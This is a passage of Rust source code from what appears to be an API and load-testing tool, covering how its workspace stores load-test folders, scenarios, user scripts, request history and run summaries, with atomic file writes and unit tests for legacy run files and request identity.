        let mut entries: Vec<_> = fs::read_dir(dir)
            .map_err(io_err(dir.to_path_buf()))?
            .filter_map(|e| e.ok())
            .collect();
        entries.sort_by_key(|e| e.file_name());

        for e in entries {
            let path = e.path();
            let fname = e.file_name().to_string_lossy().to_string();
            if path.is_dir() {
                folders.push(LoadTestEntry {
                    node_ref: self.ref_of(&path)?,
                    name: fname,
                    kind: LoadTestKind::Folder,
                    id: None,
                    children: self.load_tree_at(&path)?,
                });
            } else if path.is_file() {
                let mut one = Vec::new();
                self.collect_one_load_test(&path, &fname, &mut one)?;
                tests.append(&mut one);
            }
        }
        folders.sort_by_key(|e| e.name.to_lowercase());
        tests.sort_by_key(|e| e.name.to_lowercase());
        folders.extend(tests);
        Ok(folders)
    }

    /// Create a folder for grouping load tests. `parent_ref` may be the
    /// `loadtests` root or an existing folder inside it.
    pub fn create_load_folder(&self, parent_ref: &str, name: &str) -> Result<String> {
        let parent = self.load_parent_path(parent_ref)?;
        let dir = unique_dir(&parent, &sanitize_name(name));
        fs::create_dir_all(&dir).map_err(io_err(dir.clone()))?;
        self.ref_of(&dir)
    }

    /// Rename a load-test folder. Nothing inside needs repointing by id: the
    /// scenarios move with the directory and keep their own ids, and the
    /// steps they contain refer to requests, not to this path.
    pub fn rename_load_folder(&self, node_ref: &str, new_name: &str) -> Result<String> {
        let new_name = new_name.trim();
        if new_name.is_empty() {
            return Err(CoreError::invalid("a name cannot be empty"));
        }
        let dir = self.path_of(node_ref)?;
        if !dir.is_dir() {
            return Err(CoreError::invalid(format!("not a folder: {node_ref}")));
        }
        let parent = dir
            .parent()
            .ok_or_else(|| CoreError::invalid("cannot rename the load tests root"))?;
        let desired = parent.join(sanitize_name(new_name));
        // Same reasoning as `rename_target`: the directory being renamed is
        // itself an existing directory, so a capitalisation-only change must
        // not be suffixed.
        let target = if same_file_name(&desired, &dir) {
            desired
        } else {
            unique_dir(parent, &sanitize_name(new_name))
        };
        if target != dir {
            fs::rename(&dir, &target).map_err(io_err(dir))?;
        }
        self.ref_of(&target)
    }

    /// Move a load test (or a folder of them) into another folder.
    pub fn move_load_test(&self, node_ref: &str, new_parent_ref: &str) -> Result<String> {
        let path = self.path_of(node_ref)?;
        let parent = self.load_parent_path(new_parent_ref)?;

        // Dropped where it already is: nothing to do. `unique_path` cannot
        // return an existing path, so without this the file would be renamed
        // to "name 2" and the original deleted.
        if path
            .parent()
            .is_some_and(|cur| same_file_name(cur, &parent))
        {
            return self.ref_of(&path);
        }
        // A folder cannot be moved inside itself, which would delete it.
        if parent.starts_with(&path) {
            return Err(CoreError::invalid(
                "a folder cannot be moved inside itself".to_string(),
            ));
        }

        let fname = path
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();
        let target = if path.is_dir() {
            unique_dir(&parent, &fname)
        } else {
            let (stem, ext) = if fname.ends_with(LOAD_EXT) {
                (fname.trim_end_matches(LOAD_EXT), LOAD_EXT)
            } else if fname.ends_with(USER_EXT) {
                (fname.trim_end_matches(USER_EXT), USER_EXT)
            } else {
                return Err(CoreError::invalid(format!("not a load test: {node_ref}")));
            };
            unique_path(&parent, stem, ext)
        };
        fs::rename(&path, &target).map_err(io_err(path))?;
        self.ref_of(&target)
    }

    /// Resolve a load-test parent, defaulting to the `loadtests` root, and
    /// refusing anything outside it.
    fn load_parent_path(&self, parent_ref: &str) -> Result<PathBuf> {
        let root = self.root.join(LOADTESTS_DIR);
        if parent_ref.trim().is_empty() || parent_ref.trim_end_matches('/') == LOADTESTS_DIR {
            fs::create_dir_all(&root).map_err(io_err(root.clone()))?;
            return Ok(root);
        }
        let p = self.path_of(parent_ref)?;
        if !p.starts_with(&root) {
            return Err(CoreError::invalid(format!(
                "not a load tests folder: {parent_ref}"
            )));
        }
        if !p.is_dir() {
            return Err(CoreError::not_found(format!(
                "no such folder: {parent_ref}"
            )));
        }
        Ok(p)
    }

    pub fn get_scenario(&self, node_ref: &str) -> Result<LoadScenario> {
        read_json(&self.path_of(node_ref)?)
    }

    /// Save a scenario, repairing its step references on the way out.
    ///
    /// Each step remembers both where its request was and which request it is.
    /// Writing is the natural moment to reconcile the two: a step whose path
    /// has gone stale gets the current one, and a step that predates ids gets
    /// its id filled in.
    pub fn save_scenario(&self, node_ref: &str, s: &LoadScenario) -> Result<()> {
        let path = self.path_of(node_ref)?;
        if let Some(p) = path.parent() {
            fs::create_dir_all(p).map_err(io_err(p))?;
        }

        let mut s = s.clone();
        for step in s.steps.iter_mut() {
            match self.locate_request(&step.request_ref, step.request_id.as_deref()) {
                Ok((current_ref, id)) => {
                    step.request_ref = current_ref;
                    step.request_id = Some(id);
                }
                // A step pointing at something that is simply gone is left
                // exactly as it is: rewriting it would destroy the only record
                // of what it used to point at.
                Err(_) => continue,
            }
        }
        write_json(&path, &s)
    }

    /// Find a request by id, wherever it now lives.
    ///
    /// Walks the collections tree rather than keeping an index, because an
    /// index would go stale the moment someone moved a file with git or a
    /// text editor — which is a thing this workspace format invites.
    pub fn find_request_by_id(&self, id: &str) -> Option<String> {
        // `tree()` has already parsed every request file to label it; its
        // `id` is the same one a second read would produce.
        fn walk(nodes: &[TreeNode], id: &str) -> Option<String> {
            for node in nodes {
                if node.kind == NodeKind::Request {
                    if node.id.as_deref() == Some(id) {
                        return Some(node.node_ref.clone());
                    }
                } else if let Some(hit) = walk(&node.children, id) {
                    return Some(hit);
                }
            }
            None
        }
        walk(&self.tree().ok()?, id)
    }

    /// Resolve a step's request to where it is now, and to what it is.
    ///
    /// The path is tried first because it is usually right and costs nothing;
    /// the id is the fallback that makes renaming and moving safe.
    pub fn locate_request(&self, node_ref: &str, id: Option<&str>) -> Result<(String, String)> {
        if let Ok(path) = self.path_of(node_ref) {
            if path.is_file() {
                if let Ok(req) = AnyRequest::read(&path) {
                    // A file at the expected path whose id disagrees is a
                    // different request that happens to share a name; trust
                    // the id and keep looking.
                    if id.is_none() || id == Some(req.id()) {
                        return Ok((node_ref.to_string(), req.id().to_string()));
                    }
                    // A hand-written file with no id gets a fresh random one
                    // on every read, so it can never match; its path is all
                    // there is to go on.
                    if !file_declares_id(&path) {
                        return Ok((node_ref.to_string(), req.id().to_string()));
                    }
                }
            }
        }
        if let Some(id) = id {
            if let Some(found) = self.find_request_by_id(id) {
                return Ok((found, id.to_string()));
            }
        }
        Err(CoreError::not_found(format!(
            "no request found for {node_ref}"
        )))
    }

    /// Find a load scenario by id, wherever it now lives.
    pub fn find_scenario_by_id(&self, id: &str) -> Option<String> {
        self.list_load_tests().ok()?.into_iter().find_map(|entry| {
            if !entry.node_ref.ends_with(LOAD_EXT) {
                return None;
            }
            let scenario = self.get_scenario(&entry.node_ref).ok()?;
            (scenario.id == id).then_some(entry.node_ref)
        })
    }

    /// Where a load test is now, given where it was and what it is.
    pub fn locate_load_test(&self, node_ref: &str, id: Option<&str>) -> Option<String> {
        if self.path_of(node_ref).is_ok_and(|p| p.is_file()) {
            // A user script has no id of its own, so its path is all there is.
            let matches = match (id, node_ref.ends_with(LOAD_EXT)) {
                (Some(id), true) => self.get_scenario(node_ref).is_ok_and(|s| s.id == id),
                _ => true,
            };
            if matches {
                return Some(node_ref.to_string());
            }
        }
        id.and_then(|id| self.find_scenario_by_id(id))
    }

    /// Copy a load test, giving the copy an identity of its own.
    pub fn duplicate_load_test(&self, node_ref: &str) -> Result<String> {
        let path = self.path_of(node_ref)?;
        let parent = path
            .parent()
            .ok_or_else(|| CoreError::invalid("load test has no parent"))?
            .to_path_buf();
        let file = path.file_name().unwrap_or_default().to_string_lossy();

        if file.ends_with(LOAD_EXT) {
            let mut scenario: LoadScenario = read_json(&path)?;
            let copy_name = format!("{} copy", scenario.name);
            scenario.name = copy_name.clone();
            // A copy is a different scenario: sharing an id would make runs of
            // one look like runs of the other.
            scenario.id = uuid::Uuid::new_v4().to_string();
            let target = unique_path(&parent, &sanitize_name(&copy_name), LOAD_EXT);
            write_json(&target, &scenario)?;
            self.ref_of(&target)
        } else if file.ends_with(USER_EXT) {
            let text = fs::read_to_string(&path).map_err(io_err(path.clone()))?;
            let stem = file.trim_end_matches(USER_EXT);
            let target = unique_path(&parent, &sanitize_name(&format!("{stem} copy")), USER_EXT);
            write_atomic(&target, text.as_bytes())?;
            self.ref_of(&target)
        } else {
            Err(CoreError::invalid(format!("not a load test: {node_ref}")))
        }
    }

    pub fn create_scenario(&self, name: &str) -> Result<String> {
        self.create_scenario_in("", name)
    }

    /// Create a scenario inside a load-test folder; `parent_ref` empty means
    /// the `loadtests` root.
    pub fn create_scenario_in(&self, parent_ref: &str, name: &str) -> Result<String> {
        let dir = self.load_parent_path(parent_ref)?;
        let path = unique_path(&dir, &sanitize_name(name), LOAD_EXT);
        let mut s = LoadScenario::new(name);
        s.environment = self.manifest()?.active_environment;
        write_json(&path, &s)?;
        self.ref_of(&path)
    }

    /// Rename a load scenario or a user script, moving the file to match.
    ///
    /// A scenario carries its name inside the file as well as in the filename;
    /// a user script's name is only its filename.
    pub fn rename_load_test(&self, node_ref: &str, new_name: &str) -> Result<String> {
        let new_name = new_name.trim();
        if new_name.is_empty() {
            return Err(CoreError::invalid("a name cannot be empty"));
        }
        let path = self.path_of(node_ref)?;
        let parent = path
            .parent()
            .ok_or_else(|| CoreError::invalid("load test has no parent"))?
            .to_path_buf();
        let file = path.file_name().unwrap_or_default().to_string_lossy();
        let stem = sanitize_name(new_name);

        if file.ends_with(LOAD_EXT) {
            let mut scenario: LoadScenario = read_json(&path)?;
            scenario.name = new_name.to_string();
            let target = rename_target(&parent, &path, &stem, LOAD_EXT);
            write_json(&target, &scenario)?;
            finish_rename(&path, &target)?;
            self.ref_of(&target)
        } else if file.ends_with(USER_EXT) {
            let text = fs::read_to_string(&path).map_err(io_err(path.clone()))?;
            let target = rename_target(&parent, &path, &stem, USER_EXT);
            write_atomic(&target, text.as_bytes())?;
            finish_rename(&path, &target)?;
            self.ref_of(&target)
        } else {
            Err(CoreError::invalid(format!("not a load test: {node_ref}")))
        }
    }

    pub fn read_text(&self, node_ref: &str) -> Result<String> {
        let path = self.path_of(node_ref)?;
        fs::read_to_string(&path).map_err(io_err(path))
    }

    pub fn write_text(&self, node_ref: &str, text: &str) -> Result<()> {
        let path = self.path_of(node_ref)?;
        if let Some(p) = path.parent() {
            fs::create_dir_all(p).map_err(io_err(p))?;
        }
        write_atomic(&path, text.as_bytes())
    }

    pub fn create_user_script(&self, name: &str, template: &str) -> Result<String> {
        self.create_user_script_in("", name, template)
    }

    pub fn create_user_script_in(
        &self,
        parent_ref: &str,
        name: &str,
        template: &str,
    ) -> Result<String> {
        let dir = self.load_parent_path(parent_ref)?;
        let path = unique_path(&dir, &sanitize_name(name), USER_EXT);
        write_atomic(&path, template.as_bytes())?;
        self.ref_of(&path)
    }

    // -- request history ----------------------------------------------------

    fn history_path(&self) -> PathBuf {
        self.root.join(INTERNAL_DIR).join(HISTORY_FILE)
    }

    /// Every recorded send, newest first.
    ///
    /// A missing or corrupt file reads as empty history rather than an error:
    /// it is a convenience log, and must never stop a workspace from opening.
    pub fn load_history(&self) -> Vec<HistoryEntry> {
        let p = self.history_path();
        if !p.is_file() {
            return Vec::new();
        }
        read_json::<Vec<HistoryEntry>>(&p).unwrap_or_default()
    }

    /// Replace the history file, keeping at most [`MAX_HISTORY`] entries.
    pub fn save_history(&self, entries: &[HistoryEntry]) -> Result<()> {
        let dir = self.root.join(INTERNAL_DIR);
        fs::create_dir_all(&dir).map_err(io_err(dir))?;
        let capped = &entries[..entries.len().min(MAX_HISTORY)];
        write_json(&self.history_path(), &capped)
    }

    pub fn clear_history(&self) -> Result<()> {
        let p = self.history_path();
        if p.is_file() {
            fs::remove_file(&p).map_err(io_err(p))?;
        }
        Ok(())
    }

    // -- runs ---------------------------------------------------------------

    pub fn run_dir(&self, run_id: &str) -> PathBuf {
        self.root
            .join(INTERNAL_DIR)
            .join(RUNS_DIR)
            .join(sanitize_name(run_id))
    }

    pub fn save_run_summary(&self, summary: &RunSummary) -> Result<()> {
        let dir = self.run_dir(&summary.run_id);
        fs::create_dir_all(&dir).map_err(io_err(dir.clone()))?;
        write_json(&dir.join("run.json"), summary)
    }

    pub fn save_run_timeline(&self, run_id: &str, timeline: &[Snapshot]) -> Result<()> {
        let dir = self.run_dir(run_id);
        fs::create_dir_all(&dir).map_err(io_err(dir.clone()))?;
        write_json(&dir.join("timeline.json"), &timeline)
    }

    pub fn get_run(&self, run_id: &str) -> Result<RunSummary> {
        read_json(&self.run_dir(run_id).join("run.json"))
    }

    pub fn get_run_timeline(&self, run_id: &str) -> Result<Vec<Snapshot>> {
        let p = self.run_dir(run_id).join("timeline.json");
        if !p.is_file() {
            return Ok(Vec::new());
        }
        read_json(&p)
    }

    /// The user's name and notes for a run, or the empty annotation if none.
    ///
    /// A missing or unreadable file is not an error: an annotation is a
    /// convenience, and losing it must never make a run unopenable.
    pub fn get_run_annotation(&self, run_id: &str) -> RunAnnotation {
        let p = self.run_dir(run_id).join(ANNOTATION_FILE);
        if !p.is_file() {
            return RunAnnotation::default();
        }
        read_json(&p).unwrap_or_default()
    }

    /// Save a run's name and notes, or remove the file once both are blank.
    pub fn save_run_annotation(&self, run_id: &str, ann: RunAnnotation) -> Result<RunAnnotation> {
        let ann = ann.normalized();
        let dir = self.run_dir(run_id);
        let p = dir.join(ANNOTATION_FILE);
        if ann.is_empty() {
            if p.is_file() {
                fs::remove_file(&p).map_err(io_err(p))?;
            }
            return Ok(ann);
        }
        fs::create_dir_all(&dir).map_err(io_err(dir))?;
        write_json(&p, &ann)?;
        Ok(ann)
    }

    pub fn delete_run(&self, run_id: &str) -> Result<()> {
        let dir = self.run_dir(run_id);
        if dir.is_dir() {
            fs::remove_dir_all(&dir).map_err(io_err(dir))?;
        }
        Ok(())
    }

    pub fn list_runs(&self) -> Result<Vec<RunListEntry>> {
        let dir = self.root.join(INTERNAL_DIR).join(RUNS_DIR);
        if !dir.is_dir() {
            return Ok(Vec::new());
        }
        let mut out = Vec::new();
        for e in fs::read_dir(&dir).map_err(io_err(dir.clone()))? {
            let e = match e {
                Ok(e) => e,
                Err(_) => continue,
            };
            let f = e.path().join("run.json");
            if !f.is_file() {
                continue;
            }
            // A run that cannot be read is skipped so one bad file does not
            // hide the rest — but it is logged, because a silent skip turns a
            // format problem into "your history is gone".
            let s = match read_json::<RunSummary>(&f) {
                Ok(s) => s,
                Err(e) => {
                    tracing::warn!("skipping unreadable run {}: {e}", f.display());
                    continue;
                }
            };
            {
                let ann = self.get_run_annotation(&s.run_id);
                out.push(RunListEntry {
                    label: ann.label,
                    has_notes: ann.notes.is_some(),
                    run_id: s.run_id,
                    scenario_name: s.scenario_name,
                    scenario_id: s.scenario_id,
                    scenario_ref: s.scenario_ref,
                    started_at: s.started_at,
                    state: s.state,
                    total_requests: s.total_requests,
                    error_rate: s.error_rate,
                    p95: s.overall.p95,
                });
            }
        }
        out.sort_by_key(|e| std::cmp::Reverse(e.started_at));
        Ok(out)
    }
}

#[derive(
    Debug, Clone, Copy, Default, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize,
)]
#[serde(rename_all = "camelCase")]
pub enum Protocol {
    #[default]
    Http,
    Grpc,
    Ws,
}

/// A request of either protocol, for the operations that only need to move a
/// file around and adjust its name or id.
enum AnyRequest {
    Http(Box<RequestDef>),
    Grpc(Box<GrpcRequestDef>),
    Ws(Box<WsRequestDef>),
}

impl AnyRequest {
    fn read(path: &Path) -> Result<Self> {
        let name = path.file_name().map(|s| s.to_string_lossy().to_string());
        match name {
            Some(n) if n.ends_with(GRPC_EXT) => Ok(AnyRequest::Grpc(Box::new(read_json(path)?))),
            Some(n) if n.ends_with(WS_EXT) => Ok(AnyRequest::Ws(Box::new(read_json(path)?))),
            _ => Ok(AnyRequest::Http(Box::new(read_json(path)?))),
        }
    }

    fn write(&self, path: &Path) -> Result<()> {
        match self {
            AnyRequest::Http(d) => write_json(path, d.as_ref()),
            AnyRequest::Grpc(d) => write_json(path, d.as_ref()),
            AnyRequest::Ws(d) => write_json(path, d.as_ref()),
        }
    }

    fn ext(&self) -> &'static str {
        match self {
            AnyRequest::Http(_) => REQ_EXT,
            AnyRequest::Grpc(_) => GRPC_EXT,
            AnyRequest::Ws(_) => WS_EXT,
        }
    }

    fn name(&self) -> &str {
        match self {
            AnyRequest::Http(d) => &d.name,
            AnyRequest::Grpc(d) => &d.name,
            AnyRequest::Ws(d) => &d.name,
        }
    }

    fn set_name(&mut self, name: &str) {
        match self {
            AnyRequest::Http(d) => d.name = name.to_string(),
            AnyRequest::Grpc(d) => d.name = name.to_string(),
            AnyRequest::Ws(d) => d.name = name.to_string(),
        }
    }

    fn id(&self) -> &str {
        match self {
            AnyRequest::Http(d) => &d.id,
            AnyRequest::Grpc(d) => &d.id,
            AnyRequest::Ws(d) => &d.id,
        }
    }

    fn set_id(&mut self, id: String) {
        match self {
            AnyRequest::Http(d) => d.id = id,
            AnyRequest::Grpc(d) => d.id = id,
            AnyRequest::Ws(d) => d.id = id,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum LoadTestKind {
    Scenario,
    UserScript,
    /// A folder grouping load tests. Purely organisational: unlike a
    /// collection, it carries no configuration for the things inside it, so
    /// nesting is optional and tests may sit at the root.
    Folder,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LoadTestEntry {
    pub node_ref: String,
    /// Populated only by [`WorkspaceStore::load_tree`]; the flat listing
    /// leaves it empty.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub children: Vec<LoadTestEntry>,
    pub name: String,
    pub kind: LoadTestKind,
    /// The scenario's stable id. `None` for user scripts, which are raw
    /// JavaScript files with nowhere to keep one — so a run of a script
    /// cannot be traced back to it by identity, only by path.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub id: Option<String>,
}

// ---------------------------------------------------------------------------
// File helpers
// ---------------------------------------------------------------------------

fn read_container_name(dir: &Path, file: &str) -> Option<String> {
    read_json::<ContainerDef>(&dir.join(file))
        .ok()
        .map(|c| c.name)
}

pub fn read_json<T: serde::de::DeserializeOwned>(path: &Path) -> Result<T> {
    let text = fs::read_to_string(path).map_err(io_err(path.to_path_buf()))?;
    serde_json::from_str(&text).map_err(|source| CoreError::Parse {
        path: path.to_path_buf(),
        source,
    })
}

pub fn write_json<T: serde::Serialize>(path: &Path, value: &T) -> Result<()> {
    let text = serde_json::to_string_pretty(value).map_err(|source| CoreError::Parse {
        path: path.to_path_buf(),
        source,
    })?;
    write_atomic(path, text.as_bytes())
}

/// Write via a temp file in the same directory, then rename over the target.
pub fn write_atomic(path: &Path, bytes: &[u8]) -> Result<()> {
    let parent = path
        .parent()
        .ok_or_else(|| CoreError::invalid(format!("no parent dir for {}", path.display())))?;
    fs::create_dir_all(parent).map_err(io_err(parent))?;

    let tmp = parent.join(format!(
        ".{}.tmp-{}",
        path.file_name()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "file".into()),
        uuid::Uuid::new_v4().simple()
    ));
    // Written and synced before the rename: the rename is a metadata
    // operation that can be journaled ahead of the file's data, and a crash
    // in that window leaves a truncated file under the final name — the
    // exact outcome an atomic write exists to prevent.
    let write = (|| -> std::io::Result<()> {
        use std::io::Write as _;
        let mut f = fs::File::create(&tmp)?;
        f.write_all(bytes)?;
        f.sync_all()
    })();
    if let Err(e) = write {
        let _ = fs::remove_file(&tmp);
        return Err(io_err(tmp)(e));
    }

    match replace_file(&tmp, path) {
        Ok(()) => Ok(()),
        Err(e) => {
            let _ = fs::remove_file(&tmp);
            Err(CoreError::Io {
                path: path.to_path_buf(),
                source: e,
            })
        }
    }
}

/// Atomically move `source` over `destination` when the platform supports it.
/// Both paths are in the same directory, so this never crosses filesystems.
#[cfg(not(windows))]
fn replace_file(source: &Path, destination: &Path) -> std::io::Result<()> {
    fs::rename(source, destination)
}

#[cfg(windows)]
fn replace_file(source: &Path, destination: &Path) -> std::io::Result<()> {
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::Storage::FileSystem::{
        MoveFileExW, MOVEFILE_REPLACE_EXISTING, MOVEFILE_WRITE_THROUGH,
    };

    let source: Vec<u16> = source.as_os_str().encode_wide().chain(once(0)).collect();
    let destination: Vec<u16> = destination
        .as_os_str()
        .encode_wide()
        .chain(once(0))
        .collect();
    // SAFETY: both buffers are owned, NUL-terminated UTF-16 strings and stay
    // alive for the duration of the call. The paths are in one directory.
    let moved = unsafe {
        MoveFileExW(
            source.as_ptr(),
            destination.as_ptr(),
            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH,
        )
    };
    if moved == 0 {
        Err(std::io::Error::last_os_error())
    } else {
        Ok(())
    }
}

/// `<dir>/<stem><ext>`, with " 2", " 3"... appended until free.
/// Where a rename should land.
///
/// [`unique_path`] suffixes any name that already exists — including the file
/// being renamed itself. Without this, renaming "Smoke" to "Smoke" would
/// produce "Smoke 2", and correcting only the capitalisation of a name would
/// do the same on a case-insensitive filesystem.
fn rename_target(dir: &Path, current: &Path, stem: &str, ext: &str) -> PathBuf {
    let desired = dir.join(format!("{stem}{ext}"));
    if same_file_name(&desired, current) {
        desired
    } else {
        unique_path(dir, stem, ext)
    }
}

/// Whether two paths name the same file on this platform.
///
/// Windows and macOS are case-insensitive by default, so "Smoke" and "smoke"
/// are one file there and two on Linux.
/// Whether a request file carries its own `id`, rather than getting one
/// generated each time it is read.
fn file_declares_id(path: &Path) -> bool {
    read_json::<serde_json::Value>(path)
        .map(|v| v.get("id").is_some_and(|id| id.is_string()))
        .unwrap_or(true)
}

fn same_file_name(a: &Path, b: &Path) -> bool {
    if a == b {
        return true;
    }
    if cfg!(windows) || cfg!(target_os = "macos") {
        return a
            .to_string_lossy()
            .eq_ignore_ascii_case(&b.to_string_lossy());
    }
    false
}

/// Tidy up after writing a renamed file to `target`.
///
/// Removing `current` blindly would delete the file just written when the two
/// are the same one — which is exactly what a capitalisation-only rename is.
fn finish_rename(current: &Path, target: &Path) -> Result<()> {
    if !same_file_name(current, target) {
        fs::remove_file(current).map_err(io_err(current.to_path_buf()))?;
    } else if current != target {
        // Same file, different capitalisation: the content is already correct,
        // so only the directory entry needs changing.
        fs::rename(current, target).map_err(io_err(current.to_path_buf()))?;
    }
    Ok(())
}

fn unique_path(dir: &Path, stem: &str, ext: &str) -> PathBuf {
    let mut candidate = dir.join(format!("{stem}{ext}"));
    let mut n = 2;
    while candidate.exists() {
        candidate = dir.join(format!("{stem} {n}{ext}"));
        n += 1;
        if n > 9999 {
            break;
        }
    }
    candidate
}

fn unique_dir(parent: &Path, stem: &str) -> PathBuf {
    let mut candidate = parent.join(stem);
    let mut n = 2;
    while candidate.exists() {
        candidate = parent.join(format!("{stem} {n}"));
        n += 1;
        if n > 9999 {
            break;
        }
    }
    candidate
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn ws() -> (TempDir, WorkspaceStore) {
        let tmp = TempDir::new().unwrap();
        let store = WorkspaceStore::create(tmp.path().join("ws"), "test").unwrap();
        (tmp, store)
    }

    fn stub_summary(run_id: &str, name: &str) -> RunSummary {
        let stats = TagStats {
            tag: "all".into(),
            count: 1,
            errors: 0,
            min: 1.0,
            p50: 1.0,
            p90: 1.0,
            p95: 1.0,
            p99: 1.0,
            p999: 1.0,
            max: 1.0,
            avg: 1.0,
            bytes_in: 4,
            bytes_out: 0,
        };
        RunSummary {
            version: 1,
            run_id: run_id.into(),
            scenario_name: name.into(),
            scenario_ref: format!("{name}.load.json"),
            scenario_id: None,
            started_at: 1,
            ended_at: 2,
            duration_sec: 1.0,
            state: RunState::Passed,
            error: None,
            total_requests: 1,
            total_errors: 0,
            error_rate: 0.0,
            rps: 1.0,
            overall: stats.clone(),
            per_tag: vec![stats],
            checks: Vec::new(),
            thresholds: Vec::new(),
            samples_dropped: 0,
            dropped_iterations: 0,
            status_codes: vec![StatusCount {
                protocol: Protocol::Http,
                code: 200,
                count: 1,
            }],
            errors_by_message: Vec::new(),
            bytes_in: 4,
            bytes_out: 0,
            bytes_per_sec: 4.0,
            bytes_out_per_sec: 0.0,
            peak_rps: 1.0,
            latency_distribution: Vec::new(),
            token_refreshes: 0,
            rounds: Vec::new(),
            stopped_because: None,
        }
    }

    fn stub_entry(id: &str) -> HistoryEntry {
        HistoryEntry {
            id: id.into(),
            request_ref: "collections/api/get.req.json".into(),
            request_id: None,
            name: "Get user".into(),
            protocol: Protocol::Http,
            method: "GET".into(),
            url: "https://example.test/users/1".into(),
            status: 200,
            status_text: Some("OK".into()),
            duration_ms: 12.5,
            response_bytes: 480,
            at: 1,
            ok: true,
            error: None,
            request: HistorySentRequest::new(
                vec![("accept".into(), "application/json".into())],
                Some("{}".into()),
            ),
            response: HistoryResponse::default(),
        }
    }

    /// A run.json exactly as versions before protocol-tagged status counts
    /// wrote it: `[code, count]` pairs, and no min/p99.9/bytes anywhere.
    const LEGACY_RUN_JSON: &str = r#"{
      "version": 1,
      "runId": "old-1",
      "scenarioName": "legacy smoke",
      "scenarioRef": "loadtests/smoke.load.json",
      "startedAt": 1700000000000,
      "endedAt": 1700000060000,
      "durationSec": 60.0,
      "state": "passed",
      "totalRequests": 300,
      "totalErrors": 5,
      "errorRate": 0.0166,
      "rps": 5.0,
      "overall": {"tag":"overall","count":300,"errors":5,"p50":10.0,"p90":20.0,
                  "p95":30.0,"p99":40.0,"max":99.0,"avg":12.0},
      "perTag": [{"tag":"login","count":300,"errors":5,"p50":10.0,"p90":20.0,
                  "p95":30.0,"p99":40.0,"max":99.0,"avg":12.0}],
      "checks": [],
      "thresholds": [],
      "samplesDropped": 0,
      "droppedIterations": 0,
      "statusCodes": [[200, 295], [0, 5]]
    }"#;

    fn write_legacy_run(store: &WorkspaceStore, run_id: &str) {
        let dir = store.run_dir(run_id);
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("run.json"),
            LEGACY_RUN_JSON.replace("old-1", run_id),
        )
        .unwrap();
    }

    #[test]
    fn runs_written_before_the_stats_changed_still_load() {
        let (tmp, store) = ws();
        write_legacy_run(&store, "old-1");

        let got = store.get_run("old-1").unwrap();
        assert_eq!(got.scenario_name, "legacy smoke");
        assert_eq!(got.total_requests, 300);
        // Stats that did not exist then read as zero rather than failing.
        assert_eq!(got.overall.min, 0.0);
        assert_eq!(got.overall.p999, 0.0);
        assert_eq!(got.bytes_in, 0);
        assert!(got.errors_by_message.is_empty());
        drop(tmp);
    }

    #[test]
    fn legacy_status_pairs_are_upgraded_in_place() {
        let (tmp, store) = ws();
        write_legacy_run(&store, "old-1");

        let got = store.get_run("old-1").unwrap();
        let http = got
            .status_codes
            .iter()
            .find(|c| c.code == 200)
            .expect("200 missing");
        assert_eq!(http.protocol, Protocol::Http);
        assert_eq!(http.count, 295);

        // An old file cannot say which protocol a zero belonged to, so the
        // code implies it — the same inference these runs were shown with
        // when they were written.
        let zero = got
            .status_codes
            .iter()
            .find(|c| c.code == 0)
            .expect("0 missing");
        assert_eq!(zero.protocol, Protocol::Grpc);
        assert_eq!(zero.count, 5);
        drop(tmp);
    }

    #[test]
    fn an_old_run_still_appears_in_the_list() {
        let (tmp, store) = ws();
        write_legacy_run(&store, "old-1");
        write_legacy_run(&store, "old-2");
        store
            .save_run_summary(&stub_summary("new-1", "current"))
            .unwrap();

        let runs = store.list_runs().unwrap();
        assert_eq!(runs.len(), 3, "old runs vanished from the list: {runs:?}");
        drop(tmp);
    }

    #[test]
    fn one_corrupt_run_does_not_hide_the_others() {
        let (tmp, store) = ws();
        store
            .save_run_summary(&stub_summary("good", "fine"))
            .unwrap();
        let bad = store.run_dir("bad");
        fs::create_dir_all(&bad).unwrap();
        fs::write(bad.join("run.json"), b"{ not json at all").unwrap();

        let runs = store.list_runs().unwrap();
        assert_eq!(runs.len(), 1);
        assert_eq!(runs[0].run_id, "good");
        drop(tmp);
    }

    #[test]
    fn an_upgraded_run_can_be_annotated_and_re_saved() {
        let (tmp, store) = ws();
        write_legacy_run(&store, "old-1");

        // Naming an old run must work, and re-saving it must not lose the
        // upgrade: the round trip writes the current shape back out.
        store
            .save_run_annotation(
                "old-1",
                RunAnnotation {
                    label: Some("Last month's baseline".into()),
                    notes: None,
                },
            )
            .unwrap();
        let summary = store.get_run("old-1").unwrap();
        store.save_run_summary(&summary).unwrap();

        let reread = store.get_run("old-1").unwrap();
        assert_eq!(reread.status_codes.len(), 2);
        assert_eq!(reread.total_requests, 300);
        let listed = store.list_runs().unwrap();
        assert_eq!(listed[0].label.as_deref(), Some("Last month's baseline"));
        drop(tmp);
    }

    // -- stable identity -----------------------------------------------------

    fn step(request_ref: &str) -> LoadStep {
        LoadStep {
            request_ref: request_ref.to_string(),
            request_id: None,
            think_time_ms: None,
            capture: Vec::new(),
            tag: None,
            parallel: false,
        }
    }

    /// A scenario file exactly as written before steps carried ids.
    fn write_legacy_scenario(store: &WorkspaceStore, name: &str, request_ref: &str) -> String {
        let sref = store.create_scenario(name).unwrap();
        let path = store.path_of(&sref).unwrap();
        let raw = format!(
            r#"{{"version":1,"name":"{name}","mode":"closed","stages":[],
               "durationSec":10,"maxVus":4,"environment":null,
               "steps":[{{"requestRef":"{request_ref}","capture":[],"tag":"get"}}],
               "thresholds":[],"checks":[]}}"#
        );
        fs::write(&path, raw).unwrap();
        sref
    }

    #[test]
    fn renaming_a_request_repoints_the_scenarios_that_use_it() {
        let (tmp, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let req = store.create_request(&coll, "Get user").unwrap();
        let sref = write_legacy_scenario(&store, "smoke", &req);

